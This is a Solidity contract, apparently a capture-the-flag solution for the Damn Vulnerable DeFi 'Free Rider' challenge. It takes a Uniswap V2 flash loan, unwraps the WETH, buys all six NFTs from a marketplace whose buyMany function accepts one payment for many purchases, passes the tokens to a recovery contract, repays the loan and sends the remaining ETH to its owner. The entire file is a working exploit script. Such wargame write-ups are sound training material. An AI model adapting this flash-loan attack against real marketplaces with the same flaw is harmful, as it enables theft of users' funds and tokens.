// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";

/**
 * @title FreeRiderExploit
 * @author scorpion9979
 */
contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecovery public immutable recovery;
    IERC721 public immutable nft;
    IUniswapV2Pair public immutable pool;
    address private immutable owner;
    uint256 private constant loanAmount = 15 ether;
    uint256 private constant nftAmount = 6;

    constructor(FreeRiderNFTMarketplace _marketplace, FreeRiderRecovery _recovery, IUniswapV2Pair _pool) {
        marketplace = _marketplace;
        recovery = _recovery;
        nft = _marketplace.token();
        owner = msg.sender;
        pool = _pool;
    }

    function exploit() public {
        pool.swap(loanAmount, 0, address(this), abi.encode(""));
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external override {
        // withdraw eth from weth contract using flash loaned weth
        (bool success, ) = pool.token0().call(abi.encodeWithSignature("withdraw(uint256)", amount0));
        require(success, "withdraw weth failed");

        // buy all nfts with loaned eth
        uint256[] memory tokenIds = new uint256[](nftAmount);
        for (uint256 i = 0; i < nftAmount; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: amount0}(tokenIds);

        // transfer all nfts to recovery contract
        for (uint256 i = 0; i < nftAmount; i++) {
            if (i != nftAmount - 1) {
                nft.safeTransferFrom(address(this), address(recovery), i, "");
            } else {
                bytes memory _data = abi.encode(address(this));
                nft.safeTransferFrom(address(this), address(recovery), i, _data);
            }
        }

        // deposit all eth back into weth contract
        uint256 repayAmount = amount0 * 1000 / 997 + 1;

        // deposit repayAmount eth to weth contract
        (success, ) = pool.token0().call{value: repayAmount}(abi.encodeWithSignature("deposit()"));
        require(success, "deposit weth failed");

        // repay weth flash loan
        (success, ) = pool.token0().call(abi.encodeWithSignature("transfer(address,uint256)", address(pool), repayAmount));
        require(success, "repay loan failed");

        // transfer all remaining eth to owner
        Address.sendValue(payable(owner), address(this).balance);
    }

    // enable contract to receive nfts
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // enable contract to receive eth
    receive() external payable {}
}
